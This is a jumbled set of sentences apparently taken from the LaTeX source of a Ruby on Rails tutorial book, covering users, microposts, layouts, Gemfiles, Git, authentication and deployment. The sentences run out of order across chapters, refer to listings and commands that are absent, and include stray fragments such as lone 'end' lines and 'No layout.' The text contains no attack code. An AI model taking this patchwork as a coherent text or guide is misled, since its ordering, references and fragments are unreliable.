Now we'll create a second user by revisiting the \href{http://0.0.0.0:3000/users/new}{\texttt{new}} page and submitting a second set of user information; the resulting user \href{http://0.0.0.0:3000/users}{\texttt{index}} is shown in Figure~\ref{fig:demo_user_index_two_rails_3}.
The user index page (\href{http://0.0.0.0:3000/users}{/users}) with a second user.
Our strategy will be to describe the results of a typical browser hit---a visit to the user index page at \href{http://0.0.0.0:3000/users}{/users}---in terms of MVC (Figure~\ref{fig:mvc_detailed}).
Variables that start with the \kode{@}~sign, called \emph{instance variables}, are automatically available in the views; in this case, the \kode{index.html.erb} view in Listing~\ref{code:demo_index_view} iterates through the \kode{@users} list and outputs a line of HTML for each one.
No layout.
To make some actual microposts, we enter information at the new microposts page, \href{http://0.0.0.0:3000/microposts/new}{/microposts/new}, as seen in Figure~\ref{fig:demo_new_micropost}.
The new micropost page (\href{http://0.0.0.0:3000/microposts/new}{/microposts/new}).
The micropost index page (\href{http://0.0.0.0:3000/microposts}{/microposts}).
This chapter covers a lot of material, and it's OK not to get it all on the first pass.
We've \emph{almost} achieved that with our current layout, with one wrinkle: as you can see if you delete the \kode{provide} call in one of the views, in the absence of a page-specific  title the full title appears as follows:
In other words, there's a suitable base title, but there's also a trailing vertical bar character \kode{|} at the end.
Start the console at the command line as follows:
There's an important difference, though; Ruby won't interpolate into single-quoted strings:
When building web applications, it is often useful to get a high-level overview of the user interface as early as possible.
As a first step toward adding links and styles to the sample application, we'll update the site layout file \kode{application.html.erb} (last seen in Listing~\ref{code:application_layout_full_title}) with additional HTML structure.
Ruby 1.9 actually guarantees that hashes keep their elements in the same order entered, but it would be unwise ever to count on a particular ordering.
Since it's so common for hashes to use symbols as keys, Ruby~1.9 supports a new syntax just for this special case:
To take advantage of the upcoming style elements, we'll add some extra elements to the \kode{home.html.erb} view (Listing~\ref{code:signup_button}).
To make this clearer, let's look at the HTML this tag produces
The \kode{alt} attribute is what will be displayed if there is no image, and it is also what will be displayed by screen readers for the visually impaired.
Luckily, Rails includes a default \kode{alt} attribute; if you don't specify the attribute in the call to \kode{image\_tag}, Rails just uses the image filename (minus extension).
In Ruby, they are optional; these two are equivalent:
Adding the \texttt{bootstrap-sass} gem to the \kode{Gemfile}.
When hashes are the \emph{last} argument in a function call, the curly braces are optional; these two are equivalent:
as shown in Listing~\ref{code:bootstrap_config}.
Adding a line for asset pipeline compatibility.
Here both the directory name and filename are important.
(It's actually at 78 columns, which gives you a little margin for error.)
calls the \kode{stylesheet\_link\_tag} function with two arguments: a string, indicating the path to the stylesheet, and a hash with two elements, indicating the media type and telling Rails to use the \href{https://github.com/rails/turbolinks}{turbolinks} feature (new in Rails~4).
(Turbolinks will be described in more detail in a future draft of this book.)
Because of the \kode{navbar-fixed\-top} class in the \kode{header} tag, Bootstrap fixes the navigation bar to the top of the page, so the padding serves to separate the main text from the navigation.
Note the leading underscore on the filename \kode{\_shim.html.erb}; this underscore is the universal convention for naming partials, and among other things makes it possible to identify all the partials in a directory at a glance.
If this example strikes you as a bit contrived, good; this is by design.
For those familiar with JavaScript, this functionality is comparable to using a built-in class prototype object to augment the class.
(Thanks to reader \href{http://getsatisfaction.com/railstutorial/topics/adding_methods_to_built_in_classes_comparable_to_using_javascripts_prototype_object}{Erik Eldridge} for pointing this out.)
This is why, if your principal programming interest is writing web applications, I recommend learning Rails first, then learning Ruby, then looping back to Rails.
Then commit the other changes to the main source code repository:
Then create a \kode{params} hash so that \kode{params[:father]} is \kode{person1}, \kode{params[:mother]} is \kode{person2}, and \kode{params[:child]} is \kode{person3}.
Find an online version of the Ruby API and read about the \kode{Hash} method \kode{merge}.
in Listing~\ref{code:contact_page_test}.
Submitting the \href{http://0.0.0.0:3000/sessions/new}{/sessions/new} form then yields the result shown in Figure~\ref{fig:initial_failed_login_rails_3}.
We'll start in the header partial, \kode{\_header.html.erb} (Listing~\ref{code:header_partial_links}), which has links to the Home and Help pages.
The other place with links is the footer partial, \kode{\_footer.html.erb}, which has links for the About and Contact pages (Listing~\ref{code:footer_partial_links}).
With that, our layout has links to all the static pages created in Chapter~\ref{cha:static_pages}, so that, for example, \href{http://0.0.0.0:3000/about}{/about} goes to the About page (Figure~\ref{fig:about_page}).
The About page at \href{http://0.0.0.0:3000/about}{/about}.
Linking the button to the Signup page.
The new signup page at \href{http://0.0.0.0:3000/signup}{/signup}.
in Listing~\ref{code:full_title_helper_tests}.
Tests for the \kode{full\_title} helper.
As \href{http://sivers.org}{Derek Sivers} notes in the foreword, this book is structured as a linear narrative, designed to be read from start to finish.
If you are used to skipping around in technical books, taking this linear approach might require some adjustment, but I suggest giving it a try.
You can think of the \emph{Ruby on Rails Tutorial} as a video game where you are the main character, and where you level up as a Rails developer in each chapter.
(The exercises are the \href{http://en.wikipedia.org/wiki/Boss_(video_gaming)#Miniboss}{minibosses}.)
Rails also adapts rapidly to new developments in web technology and framework design.
This means that, no matter where you currently are in your knowledge of web development, by the time you finish this tutorial you will be ready for more advanced Rails resources, as well as for the more systematic treatments of the other subjects mentioned.
It also means that there's a \emph{lot} of material to cover; if you don't already have much experience programming computers, you might find it overwhelming.
The comments below contain some suggestions for approaching the \emph{Rails Tutorial} depending on your background.
Another common question is whether to use tests from the start.
If you find yourself getting bogged down by the tests, I suggest either skipping them on a first reading or (even better) using them as a tool to verify your code's correctness without worrying about how they work.
If you are completely new to web programming and find the \emph{Rails Tutorial} too difficult, I suggest learning the basics of HTML and CSS and then giving the \emph{Rails Tutorial} another go.
(Unfortunately, I don't have a personal recommendation here, but \href{http://headfirstlabs.com/books/hfhtml/}{\emph{Head First HTML}} looks promising, and one reader recommends \href{http://www.amazon.com/gp/product/0596526873}{\emph{CSS: The Missing Manual}} by David Sawyer McFarland.)
You might also consider reading the first few chapters of \href{http://www.amazon.com/gp/product/1430223634}{\emph{Beginning Ruby}} by Peter Cooper, which starts with sample applications much smaller than a full-blown web app.
Be warned that if your background is in C/C++ or Java, you may find Ruby a bit of an odd duck, and it might take time to get used to it; just stick with it and eventually you'll be fine.
(Ruby even lets you put semicolons at the ends of lines if you miss them too much.)
The \emph{Rails Tutorial} covers all the web-specific ideas you'll need, so don't worry if you don't currently know a \texttt{POST} from a \texttt{PATCH}.
The basics of what we cover will likely be familiar, but test-driven development may be new to you, as may be the structured REST style favored by Rails.
Ruby has its own idiosyncrasies, so those will likely be new, too.
Based on reader feedback, I'm confident that you can still get a lot out of this book.
Among other things, the techniques here may be more up-to-date than the ones you picked up when you originally learned Rails.
After finishing the \emph{Ruby on Rails Tutorial}, I recommend that experienced programmers read \href{http://www.amazon.com/gp/product/1933988657}{\emph{The Well-Grounded Rubyist}} by David~A. Black, \href{http://www.amazon.com/Eloquent-Ruby-Addison-Wesley-Professional-Series/dp/0321584104/}{\emph{Eloquent Ruby}} by Russ Olsen, or \href{http://www.amazon.com/gp/product/0672328844}{\emph{The Ruby Way}} by Hal Fulton, which is also fairly advanced but takes a more topical approach.
Before moving on with the rest of the introduction, I'd like to take a moment to address the one issue that dogged the Rails framework the most in its early days: the supposed inability of Rails to ``scale''---i.e., to handle large amounts of traffic.
Part of this issue relied on a misconception; \href{http://idleprocess.wordpress.com/2009/11/24/presentation-summary-high-performance-at-massive-scale-lessons-learned-at-facebook/}{you scale a \emph{site}, not a framework}, and Rails, as awesome as it is, is only a framework.
So the real question should have been, ``Can a site built with Rails scale?''
In any case, the question has now been definitively answered in the affirmative: some of the most heavily trafficked sites in the world use Rails.
Actually \emph{doing} the scaling is beyond the scope of just Rails, but rest assured that if \emph{your} application ever needs to handle the load of Hulu or the Yellow Pages, Rails won't stop you from taking over the world.
When reading the \emph{Rails Tutorial}, you may find it convenient to follow an internal section link to look at the reference and then immediately go back to where you were before.
This is easy when reading the book as a web page, since you can just use the Back button of your browser, but both Adobe Reader and OS~X's Preview allow you to do this with the PDF as well.
In Reader, you can right-click on the document and select ``Previous View'' to go back.
In Preview, use the Go menu: \texttt{Go > Back}.
Many people erroneously believe that \kode{sudo} stands for ``superuser do'' because it runs commands as the superuser (root) by default.
In fact, \kode{sudo} is a concatenation of the \kode{su} command and the English word ``do'', and \kode{su} stands for ``substitute user'', as you can verify by typing \kode{man su} in your shell.
This etymology also suggests the pronunciation ``SOO-doo'' (because the word ``do'' is pronounced ``doo''), although the alternate pronunciation ``SOO-doh'' is also common.
On Windows, the analogous directory would be
C:\Sites\sample_app
For clarity, the \emph{Rails Tutorial} will refer to the Rails root as the \emph{application root}, and henceforth all directories will be relative to this directory.
For example, the \kode{config} directory of my sample application is
The application root directory here is everything before \kode{config}, i.e.,
For brevity, when referring to the file
I'll omit the application root and simply write \kode{config/routes.rb}.
# gem 'therubyracer',  platforms: :ruby
# Read more: https://github.com/rails/turbolinks
# Use unicorn as the app server
# Use debugger
# gem 'debugger', group: [:development, :test]
as seen in Listing~\ref{code:gemfile_sqlite_version}.
The syntax
installs the latest version of the \kode{uglifier} gem (which handles file compression for the asset pipeline) as long as it's greater than or equal to version~\kode{1.3.0}---even if it's, say, version~\kode{7.2}.
Meanwhile, the code
installs the gem \kode{coffee-rails} (also needed by the asset pipeline) as long as it's newer than version~\kode{4.0.0} but not newer than \kode{4.1}.
Unfortunately, experience shows that even minor point releases can break things, so for the \emph{Rails Tutorial} we'll err on the side of caution by including exact version numbers for virtually all gems.
In fact, you can even leave off \kode{install}.
The \kode{bundle} command by itself is an alias for \kode{bundle install}.
=> Rails application starting on http://0.0.0.0:3000
Opening the project
   $ <editor name> .
   $ subl .
(where \kode{vim} might be \kode{gvim} or \kode{mvim} depending on which flavor of Vim you use).
As a final setup step, you can optionally set the editor Git will use for commit messages.
If you use a graphical editor such as Sublime Text, TextMate, gVim, or MacVim, you need to use a flag to make sure that the editor stays attached to the shell instead of detaching immediately
Normally this is a feature, since it lets you continue to use the command line after launching your editor, but Git interprets the detachment as closing the file with an empty commit message, which prevents the commit from going through.
I only mention this point because it can be seriously confusing if you try to set your editor to \kode{subl} or \kode{gvim} without the flag.
(If you find this note confusing, it is safe to ignore it.)
Replace \kode{"subl -w"} with \kode{"mate -w"} for TextMate, \kode{"gvim -f"} for gVim, or \kode{"mvim -f"} for MacVim.
There's a minor complication, though: by default Git tracks the changes of \emph{all} the files, but there are some files we don't want to track.
For example, Rails creates log files to record the behavior of the application; these files change frequently, and we don't want our version control system to have to update them constantly.
Git has a simple mechanism to ignore such files: simply include a file called \kode{.gitignore} in the application root directory with some rules telling Git which files to ignore
If you can't see the \kode{.gitignore} file in your directory, you may need to configure your directory viewer to show hidden files.
as shown in Listing~\ref{code:default_gitignore}.
The default \kode{.gitignore} created by the \kode{rails} command.
# See http://help.github.com/ignore-files/ for more about ignoring files.
# If you find yourself ignoring temporary files generated by your text editor
# or operating system, you probably want to add a global ignore instead:
#   git config --global core.excludesfile '~/.gitignore_global'
# Ignore bundler config.
/.bundle
# Ignore the default SQLite database.
/db/*.sqlite3
/db/*.sqlite3-journal
# Ignore all logfiles and tempfiles.
/log/*.log
Most of these ignored files change frequently and automatically, so including them under version control is unnecessary.
Moreover, when collaborating with others, these irrelevant changes can cause frustrating conflicts.
This augmented \kode{.gitignore} arranges to ignore Rails documentation files, Vim and Emacs swap files, and (for OS~X users) the weird \kode{.DS\_Store} directories created by the Mac Finder application.
An augmented \kode{.gitignore} file.
# Ignore other unneeded files.
*.swp
.project
DS_Store
.idea
.secret
Finally, we'll add the files in your new Rails project to Git and then commit the results.
You can add all the files (apart from those that match the ignore patterns in \kode{.gitignore}) as follows:
As mentioned above, it's also possible to abandon your topic branch changes, in this case with \kode{git branch -D}:
The resulting \kode{Gemfile} appears as in Listing~\ref{code:gemfile_pg_gem}.
#ruby-gemset=railstutorial_rails_4_0
(Here I've also added the optional RVM gemset line for convenience.
You should substitute \kode{'1.9.3'} if that's the version of Ruby you're using, though for this tutorial the difference shouldn't ever matter.)
A \kode{Gemfile} with added gems.
Because the only gems added in Listing~\ref{code:gemfile_pg_gem} are restricted to a production environment, right now this command doesn't actually install any additional local gems, but it's needed to update \kode{Gemfile.lock} with the \texttt{pg} and \texttt{rails\_12factor} gems.
If you want to share your progress at this point, feel free to send a tweet or Facebook status update with something like this:
A user profile with a follow button (\href{http://0.0.0.0:3000/users/2}{/users/2}).
A user profile with an unfollow button (\href{http://0.0.0.0:3000/users/5}{/users/5}).
Then we'll make a listing of all users (also requiring authorization), which will motivate the introduction of sample data and pagination.
We can see the result of the before filter in Listing~\ref{code:authorize_before_filter} by logging out and attempting to access the user edit page \href{http://0.0.0.0:3000/users/1/edit}{/users/1/edit}, as seen in Figure~\ref{fig:protected_log_in}.
as shown in Listing~\ref{code:fixture_second_user}.
To implement the forwarding itself, we use the \kode{redirect\_back\_or} method to redirect to the requested URL if it exists, or some default URL otherwise, which we add to the Sessions controller \kode{create} action to redirect after successful login (Listing~\ref{code:friendly_session_create}).
This evaluates to \kode{session[:forwarding\_url]} unless it's \kode{nil}, in which case it evaluates to the given default URL.
Note that Listing~\ref{code:friendly_forwarding_code} is careful to remove the forwarding URL; otherwise, subsequent login attempts would forward to the protected page until the user closed their browser.
The user profile with microposts (\href{http://0.0.0.0:3000/users/1}{/users/1}).
The profile of a different user, also with microposts (\href{http://0.0.0.0:3000/users/5}{/users/5}).
First, we'll add the \emph{Faker} gem to the \kode{Gemfile}, which will allow us to make sample users with semi-realistic names and email addresses (Listing~\ref{code:faker_gemfile}).
Adding the Faker gem to the \kode{Gemfile}.
The updated \kode{Gemfile} appears in Listing~\ref{code:will_paginate_gem}.
Including \texttt{will\_paginate} in the \kode{Gemfile}.
Adding microposts creation to the Home page (\href{http://0.0.0.0:3000/}{/}).
If you now click on either the~\href{http://0.0.0.0:3000/users?page=2}{2} link or \href{http://0.0.0.0:3000/users?page=2}{Next} link, you'll get the second page of results, as shown in Figure~\ref{fig:user_index_page_two_rails_3}.
as shown in Listing~\ref{code:users_fixtures_extra_users}.
Here Rails infers that \kode{@users} is a list of \kode{User} objects; moreover, when called with a collection of users, Rails automatically iterates through them and renders each one with the \kode{\_user.html.erb} partial.
If you like, you can verify that the form shown in Figure~\ref{fig:home_with_form} is working by submitting a valid entry and then navigating to the \href{http://0.0.0.0:3000/users/1}{profile page} to see the post, but that's rather cumbersome.
Because of this danger, it is essential to pass parameters that have been processed to permit only safe-to-edit attributes.
as shown in Listing~\ref{code:action_tests_admin}.
Running \kode{render @users} automatically calls the \kode{\_user.html.erb} partial on each user in the collection.
\emph{Hint:} Search the web; you should find one particularly robust method involving something called \kode{\_blank}.
Remove the duplicated form code by refactoring the \kode{new.html.erb} and \kode{edit.html.erb} views to use the partial in Listing~\ref{code:new_edit_partial}.
Note that you will have to pass the form variable~\kode{f} explicitly as a local variable, as shown in Listing~\ref{code:new_user_with_partial}.
Signed-in users have no reason to access the \kode{new} and \kode{create} actions in the Users controller.
Arrange for such users to be redirected to the root URL if they do try to hit those pages.
Modify the \kode{destroy} action to prevent admin users from destroying themselves.
(Write a test first.)
A partial for the new and edit form fields.
    <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
In previous versions of Rails, the \kode{rails.png} logo was included automatically with every Rails project, but in the latest version it doesn't get generated as part of \kode{rails new}, so you should download it from the main Ruby on Rails page at \href{http://rubyonrails.org/images/rails.png}{http://rubyonrails.org/images/rails.png} and place it in the \kode{app/assets/images/} directory.
Because of the \kode{navbar-fixed-top} class in the \kode{header} tag, Bootstrap fixes the navigation bar to the top of the page, so the padding serves to separate the main text from the navigation.
The effect of this line is to look for a file called  \kode{app/views/layouts/\_shim.html.erb}, evaluate its contents, and insert the results into the view
By now you can probably guess that we'll call it \kode{\_footer.html.erb} and put it in the layouts directory (Listing~\ref{code:footer_partial})
Although the view will exist as a single page of code, each profile will be customized using information retrieved from the site's database.
As with the console, \texttt{development} is the default environment for the local Rails server, but you can also run it in a different environment:
A test for the user show page.
We'll use the standard Rails location for showing a user, which is \kode{app/views/users/show.html.erb}.
Unlike the \kode{new.html.erb} view, which we created with the generator in Listing~\ref{code:generate_users_controller}, the \kode{show.html.erb} file doesn't currently exist, so you'll have to create it by hand, and then fill it with the content shown in Listing~\ref{code:stub_user_view}.
As before, we'll use \kode{generate} to make the simplest controller that meets our present needs, namely, one with a stub signup page for new users.
When we make the appropriate request to the Users controller, \kode{params[:id]} will be the user id~\texttt{1}, so the effect is the same as the \kode{find} method
With the user view and action defined, the URL \href{http://0.0.0.0:3000/users/1}{/users/1} works perfectly, as seen in Figure~\ref{fig:user_show_rails}.
Note that the debug information in Figure~\ref{fig:user_show_rails} confirms the value of \kode{params[:id]}:
To get our application to display a custom Gravatar, we'll use \kode{update\_attributes} (Section~\ref{sec:updating_user_objects}) to change the user's email to something I control:
The current state of the signup page  \href{http://0.0.0.0:3000/signup}{/signup}.
The cleanest way to do this is to reset the database with the \kode{db:reset} Rake task:
After resetting the database, on some systems the test database needs to be re-prepared as well:
Finally, on some systems you might have to restart the web server (using \texttt{Ctrl-C}) for the changes to take effect
When constructing a form using \kode{form\_for(@user)}, Rails uses \texttt{POST} if \kode{@user.new\_record?}\ is \kode{true} and \texttt{PATCH} if it is \kode{false}.
These \kode{name} values allow Rails to construct an initialization hash (via the \kode{params} variable) for creating users using the values entered by the user, as we'll see in Section~\ref{sec:unsuccessful_signups}.
A \kode{create} action that can handle signup failure (but not success).
In the case of a URL like /users/1, the value of \kode{params[:id]} is the \kode{id} of the corresponding user (\kode{1}~in this example).
As a final refactoring, we'll adopt a common convention and define a \kode{current\_user?}\ boolean method for use in the \kode{correct\_user} before filter, which we define in the Sessions helper (Listing~\ref{code:current_user_p}).
returns \kode{"0 errors"}, \kode{"1 error"}, \kode{"2 errors"}, and so on, depending on how many errors there are, thereby avoiding ungrammatical phrases such as \kode{"1 errors"} (a distressingly common mistake on \href{http://www.urbandictionary.com/define.php?term=interwebs}{teh interwebs}).
In addition, on error pages Rails automatically wraps the fields with errors in \kode{div}s with the CSS class \kode{field\_with\_errors}.
By wrapping the \kode{post} in the \kode{assert\_no\_difference} method with the string argument \kode{'User.count'}, we arrange for a comparison between \kode{User.count} before and after the contents of the \kode{assert\_no\_difference} block.
To make use of \kode{store\_location}, we need to add it to the \kode{logged\_in\_user} before filter, as shown in Listing~\ref{code:add_store_location}.
To complete a working signup form, we need to fill in the commented-out section in Listing~\ref{code:first_create_action} with the appropriate behavior.
makes a CSS class corresponding to the type of message, so that for a \kode{:success} message the class is
As with \kode{assert\_no\_difference}, the first argument is the string \kode{'User.count'}, which arranges for a comparison between \kode{User.count} before and after the contents of the \kode{assert\_difference} block.
For this test to work, it's necessary for the Users routes (Listing~\ref{code:users_resource}), the Users \kode{show} action (Listing~\ref{code:user_show_action}), and the \kode{show.html.erb} view (Listing~\ref{code:user_show_view_with_gravatar}) to work correctly.
Enabling SSL is as easy as uncommenting a single line in \kode{production.rb}, the configuration file for production applications.
To get the production site working, we have to commit the change to the configuration file and push the result up to Heroku:
Next, we need to run the migration on the production database to tell Heroku about the User data model:
As a result, when we deploy the application in Section~\ref{sec:unicorn_in_production}, SSL will automatically be enabled.
as shown in Listing~\ref{code:unicorn_gemfile}.
Because we configured Bundler not to install production gems (Section~\ref{sec:sample_app_setup}), Listing~\ref{code:unicorn_config} won't add any gems to the development environment, but we still need to run Bundler to update \kode{Gemfile.lock}:
Listing~\ref{code:unicorn_config} changes the formatting slightly so that the code fits in the standard 80 columns.
The \kode{Procfile} should be created in your application's root directory (i.e., in the same location as the \kode{Gemfile}).
As usual, we add the \kode{admin} attribute with a migration, indicating the \kode{boolean} type on the command line:
Defining an optional \kode{:size} parameter for the \kode{gravatar\_for} helper.
automatically renders each of the users in the \kode{@users} variable using the \kode{\_user.html.erb} partial.
In the present case, since we are still in the Users controller but want to paginate \emph{microposts} instead, we'll pass an explicit \kode{@microposts} variable to \kode{will\_paginate}.
The~\kode{id} attribute here is just an integer (i.e., \kode{self.id}, the unique ID of the user), so there is no danger of SQL injection in this case, but \emph{always} escaping variables injected into SQL statements is a good habit to cultivate.
Here Rails knows to call the micropost partial because each element of \kode{@feed\_items} has class \kode{Micropost}.
Note that, apart from having \kode{MicropostsController} in place of \kode{UsersController}, Listing~\ref{code:demo_microposts_controller} is \emph{identical} to the code in Listing~\ref{code:demo_users_controller}.
At this point, you should open the file \kode{app/models/micropost.rb} in your text editor or IDE and fill it with the contents of Listing~\ref{code:demo_length_validation}.
It is by inheriting from \kode{ActiveRecord::Base} that our model objects gain the ability to communicate with the database, treat the database columns as Ruby attributes, and so~on.
in Listing~\ref{code:layout_flash}.
in Listing~\ref{code:flash_test}.
Putting together the discussion above yields the User model shown in Listing~\ref{code:before_create_activation_digest}.
In Section~\ref{sec:activating_the_account}, we'll complete the process by adding some tests and then doing a little refactoring.
Because the \kode{deliveries} array is global, we have to reset it in the \kode{setup} method to prevent our code from breaking if any other tests deliver email (as will be the case in Section~\ref{sec:password_reset_test}).
This is easy using the named route \kode{edit\_user\_path} from Table~\ref{table:RESTful_users}, together with the handy \kode{current\_user} helper method defined in Listing~\ref{code:current_user_working}:
The email configuration in Listing~\ref{code:sendgrid_config} includes the \kode{user\_name} and \kode{password} of the SendGrid account, but note that they are accessed via the \kode{ENV} environment variable instead of being hard-coded.
in Listing~\ref{code:password_reset_expire_test}.
in Listing~\ref{code:general_authenticated_p}.
Looking the Bootstrap variable page, we see that there is a variable for light gray:
Then, in Chapter~\ref{cha:filling_in_the_layout} through Chapter~\ref{cha:account_activation_and_password_resets}, we'll complete the foundation for the sample application by making a site layout, a user data model, and a full registration and authentication system (including account activation and password resets).
from Listing~\ref{code:footer_css} to
Data accessible to the public (e.g., web browsers), such as error pages
42 files changed, 8461 insertions(+), 0 deletions(-)
create mode 100644 README.rdoc
create mode 100644 Rakefile
Here we're using the Unix \kode{ls} command to list the contents of the \kode{app/controllers/} directory and the \kode{rm} command to remove it (Table~\ref{table:unix_commands}).
Note also the addition of the \texttt{rails\_12factor} gem, which is used by Heroku to serve static assets such as images and stylesheets.
Rails comes with a command-line command called \kode{rails} that can generate new applications (\kode{rails new}) and run local servers (\kode{rails server}).
Because we will be finding relationships by \kode{follower\_id} and by \kode{followed\_id}, we should add an index on each column for efficiency, as shown in Listing~\ref{code:relationships_migration}.
By referring to the methods in Table~\ref{table:association_methods_relationships}, we can write the \kode{follow}, \kode{unfollow}, and \kode{following?}\ methods using the association with \kode{following}, as shown in Listing~\ref{code:follow_unfollow_following}.
We can conveniently test the data model above using the \kode{followers.include?}\ method, as shown in Listing~\ref{code:followers_test}.
As we've seen throughout this tutorial, the usual Rails convention is to implicitly render the template corresponding to an action, such as rendering \kode{show.html.erb} at the end of the \kode{show} action.
To get the follow and unfollow buttons to work, all we need to do is find the user associated with the \kode{followed\_id} in the corresponding form (i.e., Listing~\ref{code:follow_form} or Listing~\ref{code:unfollow_form}), and then use the appropriate \kode{follow} or \kode{unfollow} method from Listing~\ref{code:follow_unfollow_following}.
The updated partials appear in Listing~\ref{code:follow_form_ajax} and Listing~\ref{code:unfollow_form_ajax}.
Figure~\ref{fig:user_feed} shows a sample \kode{microposts} database table and the resulting feed.
The feed for a user (id 1) following users 2, 7, 8, and 10.
Although we don't yet know how to implement it, we can already write tests for its functionality.
The key is to check all three requirements for the feed: microposts for followed users and the user itself should be included in the feed, but a post from an \emph{unfollowed} user should not be included.
Since the final result is rather intricate, we'll build up to the final feed implementation by introducing one piece at a time.
What we want to do is select from the \kode{microposts} table all the microposts with ids corresponding to the users being followed by a given user (or the user itself).
(Here we've used the Rails convention of \kode{user} instead of \kode{user.id} in the condition; Rails automatically uses the~\kode{id}.
The Micropost migration.
(Note the index on \kode{user\_id} and \kode{created\_at}.)
This notation actually started as an extension Rails made to the core Ruby language; it was so useful that it has now been incorporated into Ruby itself.
You can verify this yourself by running the test suite, which should pass:
In some applications, this initial implementation might be good enough for most practical purposes.
But it's not the final implementation; see if you can make a guess about why not before moving on to the next section.
(\emph{Hint:} What if a user is following 5000 other users?)
(It actually works either way, but logically it makes more sense to interpolate in this context.)
This code has a formidable combination of Rails, Ruby, and SQL, but it does the job, and does it well.
(Of course, even the subselect won't scale forever.
For bigger sites, you would probably need to generate the feed asynchronously using a background job, but such scaling subtleties are beyond the scope of this tutorial.)
(You can verify this by examining the SQL statements in the development server log file.)
The resulting test appears in Listing~\ref{code:home_feed_test}.
As a first step in this process, this section contains some suggested extensions to the core application, as well as suggestions for further learning.
Before moving on to tackle any of the application extensions, it's a good idea to merge in your changes:
As usual, you can also push the code and deploy the application if you want:
\href{http://railscasts.com/}{RailsCasts}: It's hard to overemphasize what a great resource RailsCasts is.
I suggest starting by visiting the \href{http://railscasts.com/episodes/archive}{RailsCasts episode archive} and clicking on subjects that catch your eye.
Our first step is to add a delete link to the micropost partial as in Listing~\ref{code:feed_item_partial}.
in Listing~\ref{code:micropost_model_image_validation}.
Not coincidentally, we already have exactly the methods we need: the \kode{User.find\_by} method provided by Active Record (Section~\ref{sec:finding_user_objects}) and the  \kode{authenticate} method provided by \kode{has\_secure\_password} (Section~\ref{sec:user_authentication}).
The result of the CSS in Listing~\ref{code:universal_css} is shown in Figure~\ref{fig:sample_app_universal}.
Applying the results of the above discussion yields the succinct \kode{current\_user} method shown in Listing~\ref{code:current_user}.
in Listing~\ref{code:header_partial} and
A user is logged in if there is a current user in the session, i.e., if \kode{current\_user} is not \kode{nil}.
In versions of Rails before 3.0 (including 3.0 itself), static assets lived in the \kode{public/} directory, as follows:
Although we've defined the \kode{password\_digest} attribute required by \kode{has\_secure\_password}, sometimes it's convenient to refer to the plain (virtual) password as well.
as shown in Listing~\ref{code:user_login_test_valid_information}.
Because the application code was already working, this test should be \passing:
With the asset pipeline, we don't have to choose between speed and convenience:
With the session \kode{destroy} action thus defined and tested, the initial  signup/login/logout triumvirate is complete, and the test suite should be \passing:
Using \kode{self} ensures that assignment sets the user's \kode{remember\_token} attribute.
With these considerations in mind, we can create a valid token and associated digest by first making a new remember token using \kode{User.new\_token}, and then updating the remember digest with the result of applying \kode{User.digest}. This procedure gives the \kode{remember} method shown in Listing~\ref{code:user_model_remember}.
as shown in Listing~\ref{code:remember_me_css}.
Moreover, persistent sessions are cumbersome to check by hand, so if we ever want to refactor the \kode{current\_user} method (as we will in Chapter~\ref{cha:account_activation_and_password_resets}) it's important to test it.
as shown in Listing~\ref{code:persistent_sessions_test}.
The result appears in Listing~\ref{code:log_out_with__close_browser}
as shown in Listing~\ref{code:close_route}.
in Listing~\ref{code:_close_browser}.
in Listing~\ref{code:close_route}.
Finally, in Chapter~\ref{cha:account_activation_and_password_resets} we'll add account activation (thereby confirming a valid email address) and password resets.
Taken together, the material in Chapter~\ref{cha:modeling_users} through Chapter~\ref{cha:account_activation_and_password_resets} develops a full Rails login and authentication system.
(The first line here is just to make sure that you start on the master branch, so that the \kode{modeling-users} topic branch is based on \kode{master}.
By using an email address as the username, we open  the possibility of communicating with our users at a future date (Chapter~\ref{cha:account_activation_and_password_resets}).
The migration itself consists of a \kode{change} method that determines the change to be made to the database.
Inside the block, the \kode{create\_table} method uses the \kode{t}~object to create \kode{name} and \kode{email} columns in the database, both of type \kode{string}
The final line in the block, \kode{t.timestamps}, is a special command that creates two \emph{magic columns} called \kode{created\_at} and \kode{updated\_at}, which are timestamps that automatically record when a given user is created and updated.
Of course, knowledge of this inheritance doesn't do any good unless we know what \kode{ActiveRecord::Base} contains, so let's get started with some concrete examples.
They are important, though, and I suggest learning about them using one of the Ruby books recommended in Section~\ref{sec:comments_for_various_readers}.
=> [#<User id: 1, name: "Michael Hartl", email: "mhartl@example.com",
Now that we've updated the user by running \kode{user.save}, the magic columns differ, as promised in Section~\ref{sec:creating_user_objects}:
The second main way to update attributes is to use \kode{update\_attributes}:
If we only need to update a single attribute, using the singular \kode{update\_attribute} bypasses this restriction:
(We'll put the \kode{created\_at} column to work in Section~\ref{sec:ordering_and_dependency} and Section~\ref{sec:augmenting_the_user_show_page}.)
     end
Once we define the proper associations, the resulting \kode{@micropost} variable will automatically have \kode{user\_id} equal to its associated user.
By default, using \kode{user.microposts} to pull a user's microposts from the database makes no guarantees about the order of the posts, but (following the convention of blogs and Twitter) we want the microposts to come out in reverse order of when they were created, i.e., most recent first.
Now the tests should pass.
To make these collections, it's worth knowing about the useful  \kode{\%w[]} technique for making arrays of strings, as seen in this console session:
Here the option \kode{dependent: :destroy} in
arranges for the dependent microposts (i.e., the ones belonging to the given user) to be destroyed when the user itself is destroyed.
Notice here how clever \kode{paginate} is---it even works through the microposts association, reaching into the \texttt{microposts} table and pulling out the desired page of microposts.
Instead, it asks the database to count the microposts with the given \kode{user\_id}.
In the unlikely event that finding the count is still a bottleneck in your application, you can make it even faster with a \href{http://railscasts.com/episodes/23-counter-cache-column}{\emph{counter cache}}.
With all the work making templates for user microposts in Section~\ref{sec:augmenting_the_user_show_page}, the ending was rather anticlimactic.
The uniqueness caveat
To avoid this incompatibility, we'll standardize on all lower-case addresses, converting ``Foo@ExAMPle.CoM'' to ``foo@example.com'' before saving it to the database.
See the \href{http://api.rubyonrails.org/v4.1.5/classes/ActiveRecord/Callbacks.html}{Rails API entry on callbacks} for more information on which callbacks Rails supports.
(This is just a first implementation; we'll discuss this subject again in Section~\ref{sec:remember_me}, where we'll use the preferred \emph{method reference} convention for defining callbacks.)
as seen in Listing~\ref{code:create_destroy_micropost_tests}.
       end
We'll start with the \kode{create} action for microposts, which is similar to its user analogue (Listing~\ref{code:user_create_action}); the principal difference lies in using the user/micropost association to \kode{build} the new micropost, as seen in Listing~\ref{code:microposts_create_action}.
Note the use of strong parameters via \kode{micropost\_params}, which permits only the micropost content to be edited through the web.
The User model with an added \kode{password\_digest} attribute.
